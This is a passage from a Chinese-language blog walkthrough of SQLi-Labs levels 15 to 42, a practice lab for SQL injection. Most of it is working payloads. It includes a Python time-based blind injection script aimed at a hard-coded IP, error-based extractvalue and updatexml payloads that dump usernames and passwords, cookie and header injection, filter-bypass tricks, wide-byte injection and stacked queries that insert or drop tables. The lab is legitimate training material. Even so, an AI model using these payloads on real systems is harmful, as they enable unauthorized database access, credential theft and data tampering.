<p>因此构造Username为<code>1&quot; or 1=1#</code><br><br></p>
<h4 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h4><p>字符型POST盲注</p>
<p>构造<code>1&#39; or 1=1#</code>即可登陆</p>
<p>要想通过这个注入出数据，可以写个脚本，但这里回显的语句是图片，不好进行bool盲注，于是考虑时间盲注。</p>
<p>发现构造：<code>1&#39; or sleep(3)#</code>页面会进行延时，所以脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># less-15</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-15/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_'</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = &#123;'uname':f"1' or if((substr(binary database(),&#123;i&#125;,1)='&#123;j&#125;')  ,sleep(2),1)#   " ,'passwd':'lethe','submit':'Submit'&#125;</span></span><br><span class="line">        <span class="comment"># payload = &#123;'uname':f"1' or if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)='&#123;j&#125;'),sleep(2),1)#   " ,'passwd':'lethe','submit':'Submit'&#125;</span></span><br><span class="line">        payload = &#123;<span class="string">'uname'</span>:<span class="string">f"1' or if((substr((select binary group_concat(column_name) from information_schema.columns where table_name='users') ,<span class="subst">&#123;i&#125;</span>,1)='<span class="subst">&#123;j&#125;</span>'),sleep(2),1)#   "</span> ,<span class="string">'passwd'</span>:<span class="string">'lethe'</span>,<span class="string">'submit'</span>:<span class="string">'Submit'</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=payload, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data += j</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h4 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h4><p>将less-15中的闭合方式改为<code>(&quot;$uname&quot;)</code>即可，其他都一样。</p>
<p><br></p>
<h4 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这里用check_input函数对username的值进行了过滤，而对password没有限制，因此考虑构造password。<br>可利用只有Update语句：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$update=<span class="string">"UPDATE users SET password = '$passwd' WHERE username='$row1'"</span>;</span><br></pre></td></tr></table></figure></p>
<p>所以利用报错注入，可以参考这篇文章：<a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">Mysql报错注入总结</a></p>
<p>主要的分为三种方法：</p>
<ul>
<li>BIGINT等数据类型溢出<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>在mysql&gt;5.5.53时，则不能返回查询结果</p>
<ul>
<li>xpath语法错误<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'</span><br><span class="line"></span><br><span class="line">mysql&gt; select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2019/07/26/SQLi-Labs通关笔记/20190720204335538.png" alt="在这里插入图片描述"></p>
<ul>
<li>concat+rand()+group_by()导致主键重复（floor()报错注入）</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry '5.5.54-log1' for key 'group_key'</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry '5.5.54-log1' for key 'group_key'</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry '5.5.54-log1' for key 'group_key'</span><br></pre></td></tr></table></figure>
<p><img src="/2019/07/26/SQLi-Labs通关笔记/20190720212316599.png" alt="在这里插入图片描述"><br>这题我采用extractvalue报错，payload如下：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">User Name: admin</span><br><span class="line">New Password : 1' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>))<span class="comment">#</span></span><br><span class="line">回显：XPATH syntax <span class="keyword">error</span>: <span class="string">'~emails,referers,uagents,users~'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">User</span> <span class="keyword">Name</span>: <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">New</span> <span class="keyword">Password</span> : <span class="number">1</span><span class="string">' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span><span class="keyword">users</span><span class="string">'),0x7e))#</span></span><br><span class="line"><span class="string">回显：XPATH syntax error: '</span>~<span class="keyword">id</span>,username,<span class="keyword">password</span>~<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User Name: admin</span></span><br><span class="line"><span class="string">New Password : 1'</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span>),<span class="number">0x7e</span>))<span class="comment">#</span></span><br><span class="line">回显：XPATH syntax <span class="keyword">error</span>: <span class="string">'~id,username,password~'</span></span><br></pre></td></tr></table></figure></p>
<p>接下来，当想要注出user表中的数据时，会报错：<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code>，因为在同一语句中，不能先select出同一表中的某些值，再update这个表。</p>
<p>所以要通过子查询，使select的表更换一个名称。<br>payload:<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">User Name: admin</span><br><span class="line">New Password : 1' and extractvalue(1,concat(0x7e,( <span class="keyword">select</span> * <span class="keyword">from</span> ( <span class="keyword">select</span> <span class="keyword">group_concat</span>(username,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> )a),<span class="number">0x7e</span>))<span class="comment">#</span></span><br><span class="line">回显：XPATH syntax <span class="keyword">error</span>: <span class="string">'~id,username,password~'</span></span><br><span class="line"></span><br><span class="line">发现报错的信息字数有限，因此想要获得全部数据的化可以通过<span class="keyword">limit</span>语句一条条的读:</span><br><span class="line"><span class="number">1</span><span class="string">' and extractvalue(1,concat(0x7e,( select * from ( select concat_ws('</span>:<span class="string">',username,password) from users limit 0,1)a),0x7e))#</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h4><p>进入页面发现会显示<code>Your IP ADDRESS is: xxx.xxx.xxx.xxx</code>，再根据名字判断应该是HTTP首部注入，注入的字段可能是X-Forward-For之类的地方，但登陆后会回显User-Agent的内容，这里是通过User-Agent进行注入。</p>
<p>同样是报错注入：<br>先尝试：<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190721000838862.png" alt="在这里插入图片描述"><br>由报错信息可以推测后台Insert语句<code>····VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)</code></p>
<p>因此构造payload：<br><code>1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)),&#39;&#39;,&#39;&#39;)#</code><br><img src="/2019/07/26/SQLi-Labs通关笔记/20190720235005723.png" alt="在这里插入图片描述"><br>最终payload:(通过改变limit语句逐条注出数据)<br><code>1&#39; and extractvalue(1,concat(0x7e,( select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e)),&#39;&#39;,&#39;&#39;)#</code><br><img src="/2019/07/26/SQLi-Labs通关笔记/20190720235138536.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h4 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h4><p>同样登陆后回显Referer的内容，应该是通过http首部的Referer字段进行注入。</p>
<p>先判断后台Insert语句：<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190721000622353.png" alt="在这里插入图片描述">大致为：<code>···VALUES (&#39;$uagent&#39;, &#39;$IP&#39;)</code></p>
<p>于是payload:<br><code>1&#39; and updatexml(1,concat(0x7e,(select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e),1),&#39;&#39;)#</code><br><br></p>
<h4 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h4><p>同样是http首部注入，这里是通过Cookie注入，大体流程和前面差不多。</p>
<p>payload:<br><code>uname=1&#39; and updatexml(1,concat(0x7e,(select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e),1)#</code></p>
<p>设置Cookie的值为此即可<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190721002907147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
<h4 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h4><p>这一关和less-20的区别就是对Cookie的uname进行了一下base64的编码，同时用<code>(&#39;&#39;)</code>进行的闭合。</p>
<p>所以payload：<br><code>uname=1&#39;) and updatexml(1,concat(0x7e,(select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e),1)#</code></p>
<p>base64一下得到:<br><code>uname=MScpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0ICogZnJvbSAoIHNlbGVjdCBjb25jYXRfd3MoJzonLHVzZXJuYW1lLHBhc3N3b3JkKSBmcm9tIHVzZXJzIGxpbWl0IDAsMSlhKSwweDdlKSwxKSM=</code><br>将Cookie设为base64后的payload<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190721004327173.png" alt="在这里插入图片描述"><br><br></p>
<h4 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h4><p>与less-21的区别是这里用了<code>&quot;</code>进行闭合，其他都一样。</p>
<p>payload:<br><code>uname=MSIgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgKiBmcm9tICggc2VsZWN0IGNvbmNhdF93cygnOicsdXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMgbGltaXQgMCwxKWEpLDB4N2UpLDEpIw==</code></p>
<p><br></p>
<h4 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h4><p>单引号闭合且过滤了注释符<code>#</code>和<code>--</code></p>
<p>因此使用union注入时，要构造sql语句闭合前后的单引号。</p>
<p>payload:（注意最后有个单引号用来闭合）<br><code>?id=-1&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)&#39;</code></p>
<p><br></p>
<h4 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h4><p>根据名字，是一道二次注入的题目，二次注入的题一般都要通过代码审计找出可控点，否则很难注入。</p>
<p>那就进行代码审计，整个代码逻辑比较简单：注册 =&gt; 登陆（登陆时login.php会设置Session）=&gt; 登陆后可以修改密码</p>
<p>重点关注一下操作数据库的部分，发现只有一个地方的变量在拼接到sql语句中时没有用<code>mysql_real_escape_string()</code>函数进行过滤，在pass_change.php中。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># Validating the user input........</span></span><br><span class="line">	$username= $_SESSION[<span class="string">"username"</span>];</span><br><span class="line">	$curr_pass= mysql_real_escape_string($_POST[<span class="string">'current_password'</span>]);</span><br><span class="line">	$pass= mysql_real_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">	$re_pass= mysql_real_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>($pass==$re_pass)</span><br><span class="line">	&#123;	</span><br><span class="line">		$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span>;</span><br><span class="line">		$res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be smart, Try harder!!!! :( '</span>);</span><br><span class="line">		$row = mysql_affected_rows();</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;center&gt;'</span>;</span><br><span class="line">		<span class="keyword">if</span>($row==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"Password successfully updated"</span>;</span><br><span class="line">	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			header(<span class="string">'Location: failed.php'</span>);</span><br><span class="line">			<span class="comment">//echo 'You tried to be smart, Try harder!!!! :( ';</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;&lt;center&gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Make sure New Password and Retype Password fields have same value"</span>;</span><br><span class="line">		header(<span class="string">'refresh:2, url=index.php'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>即上述代码中的<code>$username</code>在用Update语句进行修改密码时，直接从Session中获取了，没有进行任何过滤。</p>
<p>那么我们再来看看整个<code>$_SESSION[&quot;username&quot;]</code>是如何定义的，在login.php中：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   $username = mysql_real_escape_string($_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">   $password = mysql_real_escape_string($_POST[<span class="string">"login_password"</span>]);</span><br><span class="line">   $sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line"><span class="comment">//$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'";</span></span><br><span class="line">   $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be real smart, Try harder!!!! :( '</span>);</span><br><span class="line">   $row = mysql_fetch_row($res);</span><br><span class="line">	<span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> ($row[<span class="number">1</span>]) &#123;</span><br><span class="line">			<span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$login = sqllogin();</span><br><span class="line"><span class="keyword">if</span> (!$login== <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">	$_SESSION[<span class="string">"username"</span>] = $login;</span><br><span class="line">	setcookie(<span class="string">"Auth"</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);  <span class="comment">/* expire in 15 Minutes */</span></span><br><span class="line">	header(<span class="string">'Location: logged-in.php'</span>);</span><br><span class="line">&#125; </span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
<p>可以看到<code>$_SESSION[&quot;username&quot;]</code>是在登陆成功时直接从数据库中取出用户名，没有进行过滤，而这个用户名我们在注册新用户的时候是可控的，这样就找到了可控变量，注入思路也就清楚了0。<br>也就是说虽然在注册的时候构造的payload被过滤了没有办法注入，但是依旧会存到数据库里，当你直接取出并拼接到另一个sql语句时就造成了二次注入。</p>
<p>注入过程：</p>
<p>注册一个用户名为<code>admin&#39;#</code>的用户，并登陆。</p>
<p>这样在修改密码时，拼接过后的Update语句就为：<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39; admin&#39;# &#39; and password=&#39;$curr_pass&#39;</code></p>
<p>也就可以修改admin用户的密码了。</p>
<p><br></p>
<h4 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h4><p>单引号闭合，过滤了<code>or</code>、<code>and</code>、<code>&amp;&amp;</code>：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以采用双写绕过。</p>
<p>payload:（注意<code>information</code>和<code>password</code>里也有<code>or</code>，需要双写）</p>
<p><code>?id=-1&#39; union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=&#39;users&#39;),3--+</code></p>
<p><code>?id=-1&#39; union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users)--+</code><br><br></p>
<h4 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h4><p>过滤和绕过方式同less-25，区别是不需要单引号闭合了。</p>
<p>payload:<br><code>?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users)--+</code><br><br></p>
<h4 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h4><p>过滤了<code>or,and,-,#,&amp;&amp;,空格、内联注释符(/**/)</code></p>
<ul>
<li>本来<code>/**/</code>可以用来绕过空格，但这里被过滤了，所以用<code>%a0</code>绕过</li>
<li><code>or</code>和<code>and</code>依旧用双写绕过，</li>
<li>所有注释符都被过滤了，所以考虑闭合单引号而不是注释</li>
</ul>
<p>payload:<br><code>?id=0&#39;%a0union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),&#39;3</code><br><br></p>
<h4 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h4><p>和上题一样，只不过是用<code>(&#39;$id&#39;)闭合</code></p>
<p>payload:<br><code>?id=0&#39;)%a0union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),(&#39;3</code><br><br></p>
<h4 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h4><p>在前面的基础上，少过滤了<code>or</code>和<code>and</code>，多过滤了<code>union或UNION</code>和<code>select或UNION</code>,这里<code>union</code>可以用双写或大小写绕过，而<code>select</code>只能用大小写绕过，应该是过滤时使用了全局匹配。</p>
<p>payload:<br><code>?id=0&#39;%a0uNIon%a0seLEct%a01,(seLEct%a0group_concat(password)%a0from%a0users),&#39;3</code><br><br></p>
<h4 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h4><p>双引号闭合，其他和less-27一样。</p>
<p><code>?id=0&quot;%a0uNIon%a0seLEct%a01,(seLEct%a0group_concat(password)%a0from%a0users),&quot;3</code><br><br></p>
<h4 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h4><p><code>(&#39;$id&#39;)</code>闭合，其他和less-27一样。</p>
<p>payload:<br><code>?id=0&#39;)%a0uNIon%a0seLEct%a01,(seLEct%a0group_concat(password)%a0from%a0users),(&#39;3</code><br><br></p>
<h4 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h4><p>和less-28一模一样…</p>
<p>payload:<br><code>?id=0&#39;)%a0uNIon%a0seLEct%a01,(seLEct%a0group_concat(password)%a0from%a0users),(&#39;3</code><br><br></p>
<h4 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h4><p>Less 29 - Less 31这三关实际上是两层服务器架构，在做这三关之前需要把 Tomcat 为引擎的 jsp 服务器搭好。<br>参考：<a href="https://www.cnblogs.com/lcamry/p/5762961.html" target="_blank" rel="noopener">MySQL注入天书</a></p>
<p>重点：对于<code>index.php?id=1&amp;id=2</code>该如何解析呢？实际上apache（php）解析最后一个参数，即显示id=2的内容，而Tomcat（jsp）解析第一个参数，即显示id=1的内容</p>
<p>整个逻辑大概就是，获取url中查询的部分，第一个<code>id</code>的值经过<code>java_implimentation()</code>处理看是否符合<code>whitelist()</code>函数的过滤要求，若不符合就检测出攻击，否则就把第二个<code>id</code>的值拼接到sql语句中进行查询。</p>
<p>那我们分别看看这两个函数：</p>
<ul>
<li><p><code>whitelist()</code>比较简单，就是要求传入的参数必须是一位以上的数字</p>
</li>
<li><p><code>java_implimentation()</code>则将传入的参数以<code>&amp;</code>为分隔符分为两部分，然后进行遍历，若前两个字符为<code>id</code>则返回后面3到30个字符。</p>
</li>
</ul>
<p>因此构造payload：<br><code>?id=123&amp;id=-1&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code><br><br></p>
<h4 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h4><p>同上，不过是双引号闭合。</p>
<p>payload:<br><code>?id=123&amp;id=-1&quot; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code><br><br></p>
<h4 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h4><p>同上，不过是<code>(&quot;$id&quot;)</code>闭合。</p>
<p>payload:<br><code>?id=123&amp;id=-1&quot;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code><br><br></p>
<h4 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h4><p>这一关将payload中的单引号前面加上了<code>\</code>进行过滤，想到宽字节注入，即利用gbk编码<code>%df</code>+<code>%5c(\)</code> 组合出了一个 <code>運</code> 字。</p>
<p>注意，这里除了闭合的时候需要考虑绕过单引号，在注入出列名的时候，也需要用到单引号，但这里就不能用<code>%df</code>绕过了，如下面payload中的表名<code>users</code>：</p>
<p><code>?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3--+</code></p>
<p>这里可以用16进制绕过，即用<code>user</code>的16进制<code>0x7573657273</code>代替它，表名为16进制时不需要再用引号了。</p>
<p>payload:<br><code>?id=-1%df&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),3--+</code></p>
<p><code>?id=-1%df&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code></p>
<p><br></p>
<h4 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h4><p>与less-32一样…</p>
<p>payload:<br><code>?id=-1%df&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code><br><br></p>
<h4 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h4><p>这关的过滤方式和前面一样，考虑宽字节注入，但是POST传入数据时不会进行URL编码，因此这里采用将utf8单引号转为utf-16/utf-32编码绕过，即将<code>&#39;</code>转为utf-16为 <code>�&#39;</code></p>
<p>payload:<br><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">万能密码：</span><br><span class="line">Username: <span class="number">1</span>�' <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line">Password: 任意</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h4><p>GET型宽字解注入，但区别是这里是数字型，不需要用单引号闭合了，其他的和less-32一样，16进制绕过一下表名即可。</p>
<p>payload:<br><code>?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code><br><br></p>
<h4 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h4><p>好像和less-32一样..</p>
<p>payload:<br><code>?id=-1%df&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code></p>
<p><br></p>
<h4 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h4><p>好像和less-34一样…</p>
<p>payload:<br><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">万能密码：</span><br><span class="line">Username: <span class="number">1</span>�' <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line">Password: 任意</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h4><p>堆叠注入，可以执行多条语句，用分号间隔，可参考：<a href="https://www.cnblogs.com/lcamry/p/5762905.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcamry/p/5762905.html</a></p>
<p>堆叠注入优点是可以执行的语句更加灵活，如Create、Delete、Update、Insert、Drop….，但代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。</p>
<p>如执行如下payload：<br><code>?id=1&#39;;create table Lethe like users--+</code><br>执行完后页面没有变，但是查询表时可以发现多出了<code>lethe</code>表：<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190724211633834.png" alt="在这里插入图片描述"></p>
<p>再将这个表删除：<code>?id=1&#39;;drop table Lethe--+</code><br><img src="/2019/07/26/SQLi-Labs通关笔记/20190724211832450.png" alt="在这里插入图片描述"><br>发现<code>Lethe</code>表已被删除。</p>
<p>同样，我也可以在它的<code>user</code>表中插入我们自己的一条信息：<br><code>?id=1&#39;;insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)--+</code><br><br></p>
<h4 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h4><p>和less-38一样，只不过这里是数字型，无需闭合。</p>
<p><code>?id=1;insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)--+</code><br><br></p>
<h4 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h4><p>和前面两关的区别是这里用<code>(&#39;$id&#39;)</code>闭合</p>
<p><code>?id=1&#39;);insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)--+</code><br><br></p>
<h4 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h4><p>和less-39一样，<code>?id=1</code>和<code>?id=2-1</code>返回相同结果，数字型注入。</p>
<p><code>?id=1;insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)--+</code><br><br></p>
<h4 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h4><p>进入页面是一个登陆窗口，发现注册不了，提示要我们<code>hack</code>掉它，根据前面，判断应该是用堆叠注入插入一个用户到数据库中，来进行登陆。</p>
<p>但这里对Usernmae进行了过滤，因此利用Password来进行堆叠注入。</p>
